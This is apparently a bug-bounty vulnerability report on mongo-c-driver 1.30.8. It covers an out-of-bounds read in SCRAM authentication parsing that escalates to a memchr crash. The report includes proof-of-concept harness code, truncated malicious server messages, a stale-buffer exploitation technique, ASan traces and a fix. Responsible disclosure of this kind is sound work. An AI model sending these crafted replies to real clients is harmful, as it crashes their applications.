# Title

Out-of-bounds heap read in SCRAM authentication response parsing (`_mongoc_scram_step2`/`_mongoc_scram_step3`), escalating to a crash via an unbounded `memchr` call — triggerable by a malicious/compromised `mongod` (or a MITM without TLS) against any client using `mongo-c-driver`

## Summary

`mongo-c-driver`'s SCRAM-SHA-1/SCRAM-SHA-256 client authentication code (`src/libmongoc/src/mongoc/mongoc-scram.c`) parses the comma-separated `key=value` fields of the SASL messages sent by the **server** (`r=`/`s=`/`i=` in the server-first-message, `v=`/`e=` in the server-final-message) with a hand-written loop that, after recognizing a key character, advances the read pointer and dereferences it to check for `=` **without first checking that the pointer is still within the caller-supplied length**. A server response that is truncated so it ends immediately after a bare key character (no following `=value`) causes:

1. A **1-byte out-of-bounds heap read** (confirmed with AddressSanitizer), and, when the byte immediately following the logical end of the message happens to be `=` (which — as demonstrated below — an attacker reliably controls via the buffer-reuse pattern in the real call site),
2. An **integer underflow in a subsequent pointer-difference computed as the length argument to `memchr`**, turning it into a wraparound-huge `size_t`, causing `memchr` to scan far outside any valid memory and **crash the process with SIGSEGV**.

This fires while the driver is authenticating to a server — i.e., it is entirely attacker-controlled from the server side of the connection, requires no valid credentials from the attacker, and crashes the connecting client application. Both identically-shaped parsing loops in `_mongoc_scram_step2` (processes the server-first-message) and `_mongoc_scram_step3` (processes the server-final-message) have this defect; both were independently reproduced with AddressSanitizer below.

## Weakness

CWE-125 (Out-of-bounds Read), escalating via CWE-191 (Integer Underflow) in a pointer-difference used as an unsigned length argument, to a crash (SIGSEGV) in `memchr`.

## Authentication Required

**None, from the attacker's side.** The attacker *is* the entity the client is authenticating to (a malicious or compromised `mongod`/`mongos`, a rogue node a misconfigured/poisoned SRV or connection string points at, or an active on-path attacker when TLS is not used or certificate verification is disabled) — no valid MongoDB credentials are needed to send a malformed SASL reply. The victim is the client application: any process linking `mongo-c-driver` that attempts to authenticate with `SCRAM-SHA-1` or `SCRAM-SHA-256` (the default mechanism) against that server crashes during the authentication handshake, before it has any way to have verified the server's legitimacy.

## Component / Version

- Repository: `mongodb/mongo-c-driver` (HackerOne scope: **C Driver**)
- Tag audited: `1.30.8`
- Commit: [`57dba9c04991e38124022e0f16c50b87bd9b29a1`](https://github.com/mongodb/mongo-c-driver/commit/57dba9c04991e38124022e0f16c50b87bd9b29a1)
- Confirmed with a from-source build (`-fsanitize=address,undefined`, GCC 13, Ubuntu 24.04)

## Root cause, with links to the exact code

[`src/libmongoc/src/mongoc/mongoc-scram.c#L590-L643`](https://github.com/mongodb/mongo-c-driver/blob/57dba9c04991e38124022e0f16c50b87bd9b29a1/src/libmongoc/src/mongoc/mongoc-scram.c#L590-L643), `_mongoc_scram_step2`'s parser for the server-first-message:

```c
for (const uint8_t *ptr = inbuf; ptr < inbuf + inbuflen;) {
   switch (*ptr) {
   case 'r': current_val = &val_r; current_val_len = &val_r_len; break;
   case 's': current_val = &val_s; current_val_len = &val_s_len; break;
   case 'i': current_val = &val_i; current_val_len = &val_i_len; break;
   default: /* ...error... */ goto FAIL;
   }

   ptr++;                                  // <-- may now equal inbuf + inbuflen

   if (*ptr != '=') {                      // <-- L615: OOB read if so
      /* ...error... */
      goto FAIL;
   }

   ptr++;                                  // <-- may now equal inbuf + inbuflen + 1

   const uint8_t *const next_comma =
      (const uint8_t *) memchr (ptr, ',', (inbuf + inbuflen) - ptr);   // <-- L626
   ...
```

If the message ends right after a bare `r`/`s`/`i` (loop entered with `ptr == inbuf + inbuflen - 1`), the first `ptr++` puts `ptr` exactly at `inbuf + inbuflen` — one past the caller-declared valid range — and the very next line dereferences it. There is no `ptr < inbuf + inbuflen` (or equivalent) check between the two increments and their dereferences anywhere in the loop.

Worse: if that out-of-bounds byte happens to read as `'='` (attacker-influenced — see below), the code does **one more** unchecked `ptr++` and then computes `(inbuf + inbuflen) - ptr` as the length passed to `memchr`. At this point `ptr > inbuf + inbuflen`, so the pointer difference is **negative**, and being implicitly converted to `memchr`'s `size_t` parameter, **wraps around to a value near `SIZE_MAX`** — `memchr` then scans forward from `ptr` for a comma across essentially the entire address space until it hits an unmapped page, crashing the process.

[`_mongoc_scram_step3`](https://github.com/mongodb/mongo-c-driver/blob/57dba9c04991e38124022e0f16c50b87bd9b29a1/src/libmongoc/src/mongoc/mongoc-scram.c#L864-L895), which parses the server-final-message (`v=`/`e=`), has the byte-for-byte identical pattern (dereference at line 885, `memchr` at line 895) — same bug, same root cause, independently reproduced below.

### Why the "worse" (`memchr`/SIGSEGV) path is realistic, not just a synthetic PoC artifact

The real call site, [`mongoc-cluster.c`'s `_mongoc_cluster_auth_scram_continue`](https://github.com/mongodb/mongo-c-driver/blob/57dba9c04991e38124022e0f16c50b87bd9b29a1/src/libmongoc/src/mongoc/mongoc-cluster.c#L1423-L1466), declares **one** `uint8_t buf[4096]` stack buffer *outside* the SCRAM round-trip loop and reuses it, unmodified beyond the bytes actually written, as both the input and output buffer for every step:

```c
uint8_t buf[4096] = {0};
uint32_t buflen = 0;
...
if (!_mongoc_cluster_scram_handle_reply (scram, sasl_start_reply, &done, &conv_id, buf, sizeof buf, &buflen, error))
   return false;
for (;;) {
   if (!_mongoc_scram_step (scram, buf, buflen, buf, sizeof buf, &buflen, error))
      return false;
   ...
   /* ...send buf[0..buflen) to the server, get a new reply, call
      _mongoc_cluster_scram_handle_reply again, which memcpy()s only
      the new *buflen bytes into buf — bytes beyond the new buflen are
      untouched leftovers from the PREVIOUS message. */
```

[`_mongoc_cluster_scram_handle_reply`](https://github.com/mongodb/mongo-c-driver/blob/57dba9c04991e38124022e0f16c50b87bd9b29a1/src/libmongoc/src/mongoc/mongoc-cluster.c#L1391-L1399) only overwrites `buf[0 .. *buflen)`:

```c
bson_iter_binary (&iter, &btype, buflen, (const uint8_t **) &tmpstr);
if (*buflen > bufmax) { /* ...error... */ }
memcpy (buf, tmpstr, *buflen);
```

So a malicious server that controls **both** SASL round trips can: (1) in its first reply, pad the free-form tail of the `r=` field (the SCRAM spec lets the server append its own extension after the client's echoed nonce — entirely free-form, entirely server-chosen) so that a `'='` byte lands at a byte offset of its choosing within the 4096-byte buffer; then (2) send a second, shorter reply that is truncated to end exactly at that offset. The stale `'='` byte from the first message is still sitting in `buf` at that offset, since nothing clears it — turning the 1-byte overread into the unbounded `memchr` call and the SIGSEGV crash, in the exact buffer the real driver uses in production, not just an artificially-shrunk test buffer.

## Steps to Reproduce

Built `1.30.8` from source with AddressSanitizer + UBSan (`-fsanitize=address,undefined -g -O0`), then linked a small standalone C harness directly against the compiled `libmongoc-static-1.0.a`/`libbson-static-1.0.a`, calling the real (non-static, internally-linked) `_mongoc_scram_step`/`_mongoc_scram_init`/`_mongoc_scram_set_user`/`_mongoc_scram_set_pass` exactly as `mongoc-cluster.c` does, to drive a full, real SCRAM handshake and feed it a malicious step message.

**PoC 1 — the base 1-byte OOB read (`_mongoc_scram_step2`), exact-size heap buffer:**
```c
/* step1: get a real client nonce */
_mongoc_scram_init(&scram, MONGOC_CRYPTO_ALGORITHM_SHA_256);
_mongoc_scram_set_user(&scram, "testuser");
_mongoc_scram_set_pass(&scram, "testpass");
_mongoc_scram_step(&scram, out_buf, 0, out_buf, sizeof(out_buf), &out_buflen, &error);

/* malicious "server-first-message": well-formed up to a bare 'i' with no '=' */
char *msg = "r=<client-nonce>,s=YWJjZA==,i";     /* ends right after 'i' */
uint8_t *inbuf = bson_malloc(strlen(msg));        /* exact size, no slack */
memcpy(inbuf, msg, strlen(msg));

scram.step = 1;
_mongoc_scram_step(&scram, inbuf, (uint32_t) strlen(msg), out_buf, sizeof(out_buf), &out_buflen, &error);
```
Result:
```
==3031==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
READ of size 1 at ... thread T0
    #0 in _mongoc_scram_step2 mongoc-scram.c:615
    #1 in _mongoc_scram_step   mongoc-scram.c:975
0x... is located 0 bytes after 47-byte region [...]
allocated by thread T0 here:
    #1 in bson_malloc bson-memory.c:101
    #2 in main poc_scram_oob.c:61
SUMMARY: AddressSanitizer: heap-buffer-overflow mongoc-scram.c:615 in _mongoc_scram_step2
```

**PoC 2 — the escalation to SIGSEGV**, simulating the real call site's stale-byte reuse (allocate `n+1` bytes, set the caller-declared length to `n`, and place `'='` at the byte just past it — exactly what happens naturally when the real 4096-byte `buf` in `mongoc-cluster.c` still holds a `'='` left over from an earlier, attacker-controlled message):
```
crafted payload (16 logical bytes, 17 allocated): r=<nonce>,s=..,i | stale-byte='='
==3042==ERROR: AddressSanitizer: SEGV on unknown address 0x504000010000
    #0 in __memchr_evex_rtm ...
    #1 in memchr ...
    #2 in _mongoc_scram_step2 mongoc-scram.c:626
    #3 in _mongoc_scram_step   mongoc-scram.c:975
SUMMARY: AddressSanitizer: SEGV mongoc-scram.c:626 in _mongoc_scram_step2
```

**PoC 3 — identical bug in `_mongoc_scram_step3`**, reached via a *fully legitimate* step-1 → step-2 exchange (real nonce, real 16-byte salt, `i=4096`, real `salted_password`/`client_key` computed) followed by a malformed step-3 server-final-message ending bare at `v`:
```
step2 (legit) succeeded, step=2
==3063==ERROR: AddressSanitizer: heap-buffer-overflow on address ...
READ of size 1 at ... thread T0
    #0 in _mongoc_scram_step3 mongoc-scram.c:885
    #1 in _mongoc_scram_step   mongoc-scram.c:977
0x... is located 0 bytes after 18-byte region [...]
SUMMARY: AddressSanitizer: heap-buffer-overflow mongoc-scram.c:885 in _mongoc_scram_step3
```

All three reproduced consistently across multiple runs.

## Impact

Any application built on `mongo-c-driver` (or a binding built on top of it) that authenticates with `SCRAM-SHA-1`/`SCRAM-SHA-256` (the default and near-universal mechanism) against a server it does not fully trust — a malicious or compromised cluster member, a poisoned DNS/SRV record, a proxy, or an on-path attacker when TLS is not enforced/verified — can be crashed with a single malformed SASL reply during the authentication handshake, before the client has any basis for having verified the server's identity. This is a genuine memory-safety bug (an out-of-bounds read that a hostile peer can escalate into an unbounded `memchr` scan and a hard crash) in a widely-used, memory-unsafe-language official database driver — the exact bug class this program's C-driver scope exists for. I'm reporting it at the severity the demonstrated primitive supports: a reliable crash/DoS against the connecting client, not a demonstrated information leak or code-execution path — I found no way for the out-of-bounds byte's value to be echoed back to the attacker or otherwise observed beyond the internal branch/`memchr` outcome.

## Suggested Fix

Add an explicit bounds check before each dereference in both loops, e.g.:
```c
ptr++;
if (ptr >= inbuf + inbuflen || *ptr != '=') {
   bson_set_error (...);
   goto FAIL;
}
ptr++;
if (ptr > inbuf + inbuflen) {
   bson_set_error (...);
   goto FAIL;
}
const uint8_t *const next_comma = (const uint8_t *) memchr (ptr, ',', (inbuf + inbuflen) - ptr);
```
applied identically to `_mongoc_scram_step2` (lines 613-626) and `_mongoc_scram_step3` (lines 883-895). Separately, `_mongoc_cluster_auth_scram_continue`'s reused `buf[4096]` should be re-zeroed (or the previous message's byte range explicitly cleared) before each new server reply is copied in, so a fixed parser can't be re-exposed to the same class of bug by stale bytes from an earlier round trip.

## Supporting Material

- Vulnerable loops: https://github.com/mongodb/mongo-c-driver/blob/57dba9c04991e38124022e0f16c50b87bd9b29a1/src/libmongoc/src/mongoc/mongoc-scram.c#L590-L643 (step2) and https://github.com/mongodb/mongo-c-driver/blob/57dba9c04991e38124022e0f16c50b87bd9b29a1/src/libmongoc/src/mongoc/mongoc-scram.c#L864-L895 (step3)
- Reused-buffer call site: https://github.com/mongodb/mongo-c-driver/blob/57dba9c04991e38124022e0f16c50b87bd9b29a1/src/libmongoc/src/mongoc/mongoc-cluster.c#L1423-L1466
- `memcpy`-only-new-bytes helper: https://github.com/mongodb/mongo-c-driver/blob/57dba9c04991e38124022e0f16c50b87bd9b29a1/src/libmongoc/src/mongoc/mongoc-cluster.c#L1346-L1402
